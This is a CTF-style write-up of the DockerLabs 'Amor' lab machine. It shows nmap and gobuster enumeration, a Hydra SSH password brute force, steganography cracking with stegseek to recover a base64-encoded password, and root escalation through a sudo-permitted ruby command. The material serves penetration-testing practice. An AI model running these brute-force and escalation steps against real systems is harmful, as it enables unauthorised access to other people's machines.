---
layout: post
title: "AMOR - dockerlabs"
date: 2024-10-31 06:25:00 -0400
categories:
    - posts
tags:
    - Road2OSCP
    - CTF
    - en
    - writeup
---

# amor [dockerlabs]

# Enumeration

```bash
                                                                                              
┌──(root㉿kali)-[~/maquinas/amor]
└─# nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn  $target -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-30 06:49 CET
Initiating ARP Ping Scan at 06:49
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 06:49, 0.17s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 06:49
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Completed SYN Stealth Scan at 06:49, 4.32s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000037s latency).
Scanned at 2024-10-30 06:49:44 CET for 5s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 4.78 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
                                                                                                
┌──(root㉿kali)-[~/maquinas/amor]
└─# extractPorts allPorts                                                

[*] Extracting information...

        [*] IP Address: 172.17.0.2
        [*] Open ports: 22,80

[*] Ports copied to clipboard

                                                                                                
┌──(root㉿kali)-[~/maquinas/amor]
└─# nmap -sCV -p22,80 $target -oN targeted                               
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-30 06:50 CET
Nmap scan report for 172.17.0.2
Host is up (0.000097s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 7e:72:b6:8b:5f:7c:23:64:dc:15:21:32:5f:ce:40:0a (ECDSA)
|_  256 05:8a:a7:27:0f:88:b9:70:84:ec:6d:33:dc:ce:09:6f (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: SecurSEC S.L
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.18 

──(root㉿kali)-[~/maquinas/amor]
└─# gobuster dir -u http://$target -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/javascript           (Status: 301) [Size: 313] [--> http://172.17.0.2/javascript/]
/server-status        (Status: 403) [Size: 275]
Progress: 220559 / 220560 (100.00%)
===============================================================
Finished
===============================================================

```

Enumeration concluded finding ssh and http, on http side only one directory found which after the redirect http 401 was found. Used dirbuster / dirsearch with same results.

Opened the page and read that there were 2 users mentioned: juan and carlota. Juan was fired, apprently because of sharing a pass. Carlota was from sec team.

# explotation

brute force using hydra ssh:

```bash
                                                                                             
┌──(root㉿kali)-[~/maquinas/amor]
└─# hydra -t 64 -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -F -I

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-30 07:02:01
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://172.17.0.2:22/

[22][ssh] host: 172.17.0.2   login: carlota   password: babygirl
[STATUS] attack finished for 172.17.0.2 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-30 07:02:10
                                                                                       
```

after this ssh with the found password, tried to get sudo -l and also search for emails since that was the reason for firing juan

```jsx
                                                                                         
┌──(root㉿kali)-[~/maquinas/amor]
└─# ssh $target -l carlota            
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is SHA256:JcHOk/pc2uhMVqRRfurQicP/JMoOAOHmPYJ2pPxOqx0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
carlota@172.17.0.2's password: 
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.6.15-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
$ sudo -l
[sudo] password for carlota: 
Sorry, user carlota may not run sudo on bc41026b0d64.
$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 24.04 LTS
Release:        24.04
Codename:       noble
$ pwd
/home/carlota
$ ls ../
carlota  oscar  ubuntu
$ /bin/bash       
carlota@bc41026b0d64:~$ cd ../oscar/
bash: cd: ../oscar/: Permission denied
carlota@bc41026b0d64:~$ postqueue -p
bash: postqueue: command not found
carlota@bc41026b0d64:~$ cat /var/lo
local/ lock/  log/   
carlota@bc41026b0d64:~$ cat /var/lo
local/ lock/  log/   
carlota@bc41026b0d64:~$ cat /var/log/
README            apt/              dpkg.log          lastlog           
alternatives.log  bootstrap.log     faillog           private/          
apache2/          btmp              journal/          wtmp              
carlota@bc41026b0d64:~$ ps -aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   2800  1792 ?        Ss   05:46   0:00 /bin/sh -c service apache2 st
root          35  0.0  0.0   6820  4800 ?        Ss   05:47   0:00 /usr/sbin/apache2 -k start
www-data      38  7.0  0.0 2000060 9448 ?        Sl   05:47   1:17 /usr/sbin/apache2 -k start
www-data      39  7.8  0.0 2000220 8140 ?        Sl   05:47   1:26 /usr/sbin/apache2 -k start
root         104  0.0  0.0  12020  3852 ?        Ss   05:47   0:00 sshd: /usr/sbin/sshd [listene
root         105  0.0  0.0   2728  1408 ?        S    05:47   0:00 tail -f /dev/null
root         349  0.1  0.0  14428  8332 ?        Ss   06:03   0:00 sshd: carlota [priv]
carlota      360  0.9  0.0  14688  6320 ?        S    06:03   0:01 sshd: carlota@pts/0
carlota      361  0.0  0.0   2800  1792 pts/0    Ss   06:03   0:00 -sh
carlota      381  0.0  0.0   5116  3968 pts/0    S    06:04   0:00 /bin/bash
carlota      385 50.0  0.0   9580  4864 pts/0    R+   06:05   0:00 ps -aux
carlota@bc41026b0d64:~$ ls
Desktop
carlota@bc41026b0d64:~$ cd Desktop/
carlota@bc41026b0d64:~/Desktop$ ls
fotos
carlota@bc41026b0d64:~/Desktop$ cd fotos/
carlota@bc41026b0d64:~/Desktop/fotos$ ls
vacaciones
carlota@bc41026b0d64:~/Desktop/fotos$ cd vacaciones/
carlota@bc41026b0d64:~/Desktop/fotos/vacaciones$ ls
imagen.jpg

```

ps aux didnt show any mail service and known locations for logs of emails werent present. upon inspecting the directories found an image, downloaded it and cracked

```bash
                                                                                              
┌──(root㉿kali)-[~/maquinas/amor/content]
└─# scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg .
carlota@172.17.0.2's password: 
imagen.jpg                                                    100%   51KB   8.1MB/s   00:00    
               
  stegseek is a cool tool to brutefroce images
                                                                                                 
┌──(root㉿kali)-[~/maquinas/amor/content]
└─# stegseek imagen.jpg /usr/share/wordlists/rockyou.txt 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ""
[i] Original filename: "secret.txt".
[i] Extracting to "imagen.jpg.out".

                                                                                                
┌──(root㉿kali)-[~/maquinas/amor/content]
└─# cat imagen.jpg.out              
ZXNsYWNhc2FkZXBpbnlwb24=
                                              
```

stegseek is a cool tool to bruteforce images

tried to extract more information with that pass, and also to use it to su oscar which was another user spotted under home

```bash
                                                                                              
┌──(root㉿kali)-[~/maquinas/amor/content]
└─# steghide --info imagen.jpg                          
"imagen.jpg":
  format: jpeg
  capacity: 2.8 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
steghide: could not extract any data with that passphrase!

┌──(root㉿kali)-[~/maquinas/amor/content]
└─# echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 -d
eslacasadepinypon                                                                                                

```

converted the hash to base64 and used to su oscar

# escalation

```bash
carlota@bc41026b0d64:~/Desktop/fotos/vacaciones$ su oscar
Password: 
$ bash
oscar@bc41026b0d64:/home/carlota/Desktop/fotos/vacaciones$ sudo -l
Matching Defaults entries for oscar on bc41026b0d64:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User oscar may run the following commands on bc41026b0d64:
    (ALL) NOPASSWD: /usr/bin/ruby
oscar@bc41026b0d64:/home/carlota/Desktop/fotos/vacaciones$ /usr/bin/ruby -e 'exec "/bin/sh"'
$ whoami
oscar
$ bash
oscar@bc41026b0d64:/home/carlota/Desktop/fotos/vacaciones$ sudo /usr/bin/ruby -e 'exec "/bin/sh"'
# whoami
root
# 

```

# lessons learnt

- stegseek to crack images is the best
- gftobins focus on the sudo part
-